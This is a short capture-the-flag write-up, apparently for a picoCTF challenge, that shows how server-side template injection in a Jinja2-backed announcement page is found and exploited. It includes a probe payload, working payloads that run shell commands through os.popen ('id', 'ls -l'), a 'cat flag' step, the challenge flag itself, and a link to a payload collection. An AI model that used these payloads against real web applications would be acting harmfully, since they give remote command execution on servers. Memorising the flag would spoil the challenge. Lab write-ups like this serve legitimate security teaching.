# Overview
Website where you can announce whatever you want!  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/922068b0-da07-44fc-8dea-1b1c0d59735b" />  
**Hint 1:** Server Side Template Injection  

It can be seen that the web will reflect back what we enter into the box  
=> Normally we will immediately think of SSTI vulnerabilities  

# Writeup
**B1:** Recon  
I'll try entering `{{7*'7'}}` into the box and see what the web returns  
=> web page returns the string 7777777  
=> We can immediately guess that this is python's Jinja2 templates  
**B2:** Now we will enter: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` to see what the web returns  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/93ea84df-579e-4302-a007-3460b85da70e" />  
Web has actually executed our `Id` statement  
**B3:** Exploit  
Now we will find where the flag is using `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -l').read() }}`  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/04400d8f-bbf3-4dc0-8a2f-99ab81916c38" />  
=> Use `cat flag` to read  

Flag will be returned  
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}  

See more : [Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)



